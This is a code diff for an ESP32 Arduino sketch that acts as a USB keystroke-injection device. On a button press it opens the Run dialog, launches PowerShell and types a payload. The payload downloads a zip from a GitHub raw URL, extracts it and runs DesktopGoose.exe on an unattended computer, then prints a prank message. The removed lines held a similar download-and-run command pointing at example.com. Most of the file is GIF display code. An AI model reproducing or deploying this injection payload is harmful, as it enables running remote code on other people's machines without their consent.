@@ -1,107 +1,275 @@
+#include <AnimatedGIF.h>
+#include <Arduino.h>
+#include <ezButton.h>
+#include <SPI.h>
+#include <TFT_eSPI.h>
 #include <USB.h>
 #include <USBHIDKeyboard.h>
-#include <Arduino.h>
-#include <SPI.h>
-#include <WiFi.h>
-#include <ezButton.h>
-#include <TFT_eSPI.h>
-#include <FastLED.h>
 
-// Define your built-in button pin
-#define BUTTON_PIN 0  
+#include "duck.h"
 
-// Global flag to indicate USB readiness
+#define BUTTON_PIN 0
+#define GIF_IMAGE duck
+
+// #define USE_DMA 
+#define NORMAL_SPEED
+#define DISPLAY_WIDTH  tft.width()
+#define DISPLAY_HEIGHT tft.height()
+#define BUFFER_SIZE 256            // Optimum is >= GIF width or integral division of width
+
+AnimatedGIF gif;
+USBHIDKeyboard Keyboard;
+ezButton button(BUTTON_PIN);
+TFT_eSPI tft = TFT_eSPI(135, 240);
+bool shouldPlayGif = false;
 volatile bool usbReady = false;
 
-// Wrapper callback that matches the expected signature
-void usbEventHandlerWrapper(void* arg, const char* event_base, int32_t event_id, void* event_data) {
-  // The event_id corresponds to our arduino_usb_event_t values.
-  switch (event_id) {
-    case ARDUINO_USB_STARTED_EVENT:
-      usbReady = true;
-      Serial.println("USB Started. Device is ready.");
-      break;
-    case ARDUINO_USB_STOPPED_EVENT:
-      usbReady = false;
-      Serial.println("USB Stopped.");
-      break;
-    case ARDUINO_USB_SUSPEND_EVENT:
-      Serial.println("USB Suspended.");
-      break;
-    case ARDUINO_USB_RESUME_EVENT:
-      Serial.println("USB Resumed.");
-      break;
-    default:
-      break;
+#ifdef USE_DMA
+  uint16_t usTemp[2][BUFFER_SIZE]; // Global to support DMA use
+#else
+  uint16_t usTemp[1][BUFFER_SIZE];    // Global to support DMA use
+#endif
+bool     dmaBuf = 0;
+  
+// Draw a line of image directly on the LCD
+void GIFDraw(GIFDRAW *pDraw)
+{
+  uint8_t *s;
+  uint16_t *d, *usPalette;
+  int x, y, iWidth, iCount;
+
+  // Display bounds check and cropping
+  iWidth = pDraw->iWidth;
+  if (iWidth + pDraw->iX > DISPLAY_WIDTH)
+    iWidth = DISPLAY_WIDTH - pDraw->iX;
+  usPalette = pDraw->pPalette;
+  y = pDraw->iY + pDraw->y; // current line
+  if (y >= DISPLAY_HEIGHT || pDraw->iX >= DISPLAY_WIDTH || iWidth < 1)
+    return;
+
+  // Old image disposal
+  s = pDraw->pPixels;
+  if (pDraw->ucDisposalMethod == 2) // restore to background color
+  {
+    for (x = 0; x < iWidth; x++)
+    {
+      if (s[x] == pDraw->ucTransparent)
+        s[x] = pDraw->ucBackground;
+    }
+    pDraw->ucHasTransparency = 0;
+  }
+
+  // Apply the new pixels to the main image
+  if (pDraw->ucHasTransparency) // if transparency used
+  {
+    uint8_t *pEnd, c, ucTransparent = pDraw->ucTransparent;
+    pEnd = s + iWidth;
+    x = 0;
+    iCount = 0; // count non-transparent pixels
+    while (x < iWidth)
+    {
+      c = ucTransparent - 1;
+      d = &usTemp[0][0];
+      while (c != ucTransparent && s < pEnd && iCount < BUFFER_SIZE )
+      {
+        c = *s++;
+        if (c == ucTransparent) // done, stop
+        {
+          s--; // back up to treat it like transparent
+        }
+        else // opaque
+        {
+          *d++ = usPalette[c];
+          iCount++;
+        }
+      } // while looking for opaque pixels
+      if (iCount) // any opaque pixels?
+      {
+        // DMA would degrtade performance here due to short line segments
+        tft.setAddrWindow(pDraw->iX + x, y, iCount, 1);
+        tft.pushPixels(usTemp, iCount);
+        x += iCount;
+        iCount = 0;
+      }
+      // no, look for a run of transparent pixels
+      c = ucTransparent;
+      while (c == ucTransparent && s < pEnd)
+      {
+        c = *s++;
+        if (c == ucTransparent)
+          x++;
+        else
+          s--;
+      }
+    }
+  }
+  else
+  {
+    s = pDraw->pPixels;
+
+    // Unroll the first pass to boost DMA performance
+    // Translate the 8-bit pixels through the RGB565 palette (already byte reversed)
+    if (iWidth <= BUFFER_SIZE)
+      for (iCount = 0; iCount < iWidth; iCount++) usTemp[dmaBuf][iCount] = usPalette[*s++];
+    else
+      for (iCount = 0; iCount < BUFFER_SIZE; iCount++) usTemp[dmaBuf][iCount] = usPalette[*s++];
+
+#ifdef USE_DMA // 71.6 fps (ST7796 84.5 fps)
+    tft.dmaWait();
+    tft.setAddrWindow(pDraw->iX, y, iWidth, 1);
+    tft.pushPixelsDMA(&usTemp[dmaBuf][0], iCount);
+    dmaBuf = !dmaBuf;
+#else // 57.0 fps
+    tft.setAddrWindow(pDraw->iX, y, iWidth, 1);
+    tft.pushPixels(&usTemp[0][0], iCount);
+#endif
+
+    iWidth -= iCount;
+    // Loop if pixel buffer smaller than width
+    while (iWidth > 0)
+    {
+      // Translate the 8-bit pixels through the RGB565 palette (already byte reversed)
+      if (iWidth <= BUFFER_SIZE)
+        for (iCount = 0; iCount < iWidth; iCount++) usTemp[dmaBuf][iCount] = usPalette[*s++];
+      else
+        for (iCount = 0; iCount < BUFFER_SIZE; iCount++) usTemp[dmaBuf][iCount] = usPalette[*s++];
+
+#ifdef USE_DMA
+      tft.dmaWait();
+      tft.pushPixelsDMA(&usTemp[dmaBuf][0], iCount);
+      dmaBuf = !dmaBuf;
+#else
+      tft.pushPixels(&usTemp[0][0], iCount);
+#endif
+      iWidth -= iCount;
+    }
+  }
+} /* GIFDraw() */
+
+void usbEventHandlerWrapper(void *arg, const char *event_base, int32_t event_id, void *event_data)
+{
+  switch (event_id)
+  {
+  case ARDUINO_USB_STARTED_EVENT:
+    usbReady = true;
+    Serial.println("USB Started. Device is ready.");
+    break;
+  case ARDUINO_USB_STOPPED_EVENT:
+    usbReady = false;
+    Serial.println("USB Stopped.");
+    break;
+  case ARDUINO_USB_SUSPEND_EVENT:
+    Serial.println("USB Suspended.");
+    break;
+  case ARDUINO_USB_RESUME_EVENT:
+    Serial.println("USB Resumed.");
+    break;
   }
 }
 
-// Create instances for button, display, and keyboard.
-ezButton button(BUTTON_PIN);
-TFT_eSPI tft = TFT_eSPI(135, 240);
-USBHIDKeyboard Keyboard;
-
-void setup() {
-  // Initialize TFT display
-  tft.begin();
-  tft.setRotation(1);
-  tft.fillScreen(TFT_GOLD);
-
-  // Initialize Serial for debugging.
+void setup()
+{
   Serial.begin(115200);
-  Serial.println("Initializing USB with event handler...");
+  tft.begin();
+  tft.fillScreen(TFT_BLACK);
 
-  // Register the USB event handler using the wrapper.
+  gif.begin(BIG_ENDIAN_PIXELS);
+
   USB.onEvent(usbEventHandlerWrapper);
-
-  // Start USB and HID keyboard.
   USB.begin();
   Keyboard.begin();
 
-  // Optionally wait until USB is ready, up to 5 seconds.
   unsigned long timeout = millis() + 5000;
-  while (!usbReady && millis() < timeout) {
+  while (!usbReady && millis() < timeout)
+  {
     delay(10);
   }
-  if (usbReady) {
-    Serial.println("USB is ready.");
-  } else {
-    Serial.println("USB did not become ready within timeout.");
-  }
+  Serial.println(usbReady ? "USB is ready." : "USB did not become ready within timeout.");
+  Serial.println("PSRAM Size: " + String(ESP.getPsramSize()) + " bytes");
 
-  // Initialize button debouncer.
   button.setDebounceTime(50);
 }
 
-void sendKeystrokes(const char *text) {
-  // Send each character with a slight delay.
-  while (*text) {
-    if (usbReady) {
+void sendKeystrokes(const char *text)
+{
+  while (*text)
+  {
+    if (usbReady)
+    {
       Keyboard.print(*text);
     }
-    delay(5);
+    delay(2); // Small delay to ensure keystrokes register
     text++;
   }
-  if (usbReady) {
+  if (usbReady)
+  {
     Keyboard.write(KEY_RETURN);
   }
 }
 
-void loop() {
-  // Update button state.
+void openPowerShell()
+{
+  if (!usbReady)
+    return;
+
+  // Press Win + R to open the Run dialog
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(200);
+  Keyboard.releaseAll();
+  delay(500);
+
+  // Type 'powershell' and press Enter
+  sendKeystrokes("powershell");
+  Keyboard.write(KEY_RETURN);
+  delay(2000);
+}
+
+void executePayload()
+{
+  const char *payload = 
+    "$zipPath=[System.IO.Path]::GetTempPath() + 'DesktopGoose.zip';"
+    "$extractRoot=[System.IO.Path]::GetTempPath() + 'DesktopGooseExtract';"
+    "$finalExtractPath=[System.IO.Path]::GetTempPath() + 'DesktopGoose';"
+    "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/OwendB1/DesktopGooseDownload/production/DesktopGoose.zip' -OutFile $zipPath;"
+    "Expand-Archive -Path $zipPath -DestinationPath $extractRoot -Force;"
+    "$desktopGooseFolder=Get-ChildItem -Path $extractRoot -Recurse -Directory -Filter 'Desktop Goose v0.31' | Select-Object -First 1 -ExpandProperty FullName;"
+    "if ($desktopGooseFolder) { Move-Item -Path $desktopGooseFolder -Destination $finalExtractPath -Force };"
+    "$exePath=$finalExtractPath + '\\DesktopGoose.exe';"
+    "if (Test-Path $exePath) { Start-Process -FilePath $exePath };"
+    "Write-Host \"\";"
+    "Write-Host \"You left your PC open at work! That is not super smart....\";"
+    "Write-Host \"You've gotten goosed for that reason.\";"
+    "Write-Host \"You can just kill the goose using Task Manager and remove the files from your AppData folder.\";"
+    "Write-Host \"Please return the ESP32 to Owen de Bree :)\";";
+
+  sendKeystrokes(payload);
+  delay(10);
+  Keyboard.write(KEY_RETURN);
+}
+
+void loop()
+{
   button.loop();
+  if (button.isReleased())
+  {
+    Serial.println("Button pressed. Executing HID actions & playing GIF...");
+    shouldPlayGif = true;
+    openPowerShell();
+    executePayload();
+  }
 
-  // Check if the button is pressed.
-  if (button.isPressed()) {
-    tft.fillScreen(TFT_GREEN);
-    Serial.println("Button pressed. Sending HID payload...");
-
-    // Example payload – replace with your actual command if needed.
-    const char *payload = "powershell -Command \"Invoke-WebRequest -Uri 'https://example.com/DesktopGooseInstaller.exe' -OutFile 'DesktopGooseInstaller.exe'; Start-Process './DesktopGooseInstaller.exe'\"";
-    sendKeystrokes(payload);
-
-    // Delay to prevent multiple triggers from one press.
-    delay(1000);
-    tft.fillScreen(TFT_GOLD);
+  if(shouldPlayGif) {
+    if (gif.open((uint8_t *)GIF_IMAGE, sizeof(GIF_IMAGE), GIFDraw)) {
+      Serial.println("GIF opened successfully.");
+      tft.startWrite();
+      while(gif.playFrame(true, NULL)) {
+        yield();
+      }
+      gif.close();
+      tft.endWrite();
+    } else {
+      Serial.println("Failed to open GIF.");
+    }
   }
 }
